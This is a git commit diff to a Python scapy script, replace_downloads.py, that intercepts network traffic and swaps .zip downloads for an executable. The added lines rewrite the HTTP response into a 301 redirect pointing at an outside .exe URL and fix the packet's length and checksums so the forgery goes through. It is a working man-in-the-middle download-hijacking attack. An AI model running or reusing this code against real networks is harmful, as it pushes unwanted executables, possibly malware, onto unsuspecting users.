812aad9fada796bd13dc2cc8a155f2b8b828e33e
Evan <erflynn21@gmail.com>
2020-05-11 23:37:12 -0400

    Program replaces files with an exe file from winrar

--- replace_downloads.py
+++ replace_downloads.py
@@ -14,12 +14,16 @@ def process_packet(packet):
             if ".zip" in scapy_packet[scapy.Raw].load:
                 print("[+] zip Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
-                print(scapy_packet.show())
+
         elif scapy_packet[scapy.TCP].sport == 80:
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                print(scapy_packet.show())
+                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://downloadutililab.mysearchguardian.com/releases/wrarulabinstps.exe\n\n"
+                del scapy_packet[scapy.IP].len
+                del scapy_packet[scapy.IP].chksum
+                del scapy_packet[scapy.TCP].chksum
+                packet.set_payload(str(scapy_packet))
 
     packet.accept()
 
